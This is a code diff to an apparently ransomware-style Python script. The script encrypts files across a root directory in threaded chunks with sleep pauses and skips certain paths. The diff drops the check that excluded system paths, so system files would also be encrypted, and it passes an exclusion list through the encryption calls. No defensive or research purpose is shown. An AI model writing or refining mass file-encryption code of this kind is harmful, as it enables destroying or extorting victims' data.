@@ -67,9 +67,9 @@ system_paths = [
 ]
 
 # Function to encrypt a file
-def encrypt_file(file_path):
+def encrypt_file(file_path, exclude_paths):
     # Check if file is in system paths before encrypting
-    if any(file_path.startswith(path) for path in system_paths) or any(file_path.startswith(exclude_path) for exclude_path in exclude_paths):
+    if any(file_path.startswith(path) for path in exclude_paths):
         logging.debug(f"Skipping system path file {file_path}")
         return
     try:
@@ -128,7 +128,7 @@ def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
             time.sleep(5)
 
         with ThreadPoolExecutor() as executor:
-            futures = [executor.submit(encrypt_file, file) for file in chunk]
+            futures = [executor.submit(encrypt_file, file, exclude_paths) for file in chunk]
             for future in as_completed(futures):
                 try:
                     future.result()
@@ -155,12 +155,10 @@ def main():
     for script in EXCLUDE_FILES:
         script_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), script)
         if os.path.exists(script_path):
-            encrypt_file(script_path)
+            encrypt_file(script_path, exclude_paths)
 
 if __name__ == "__main__":
     main()
-
-
 
 
 
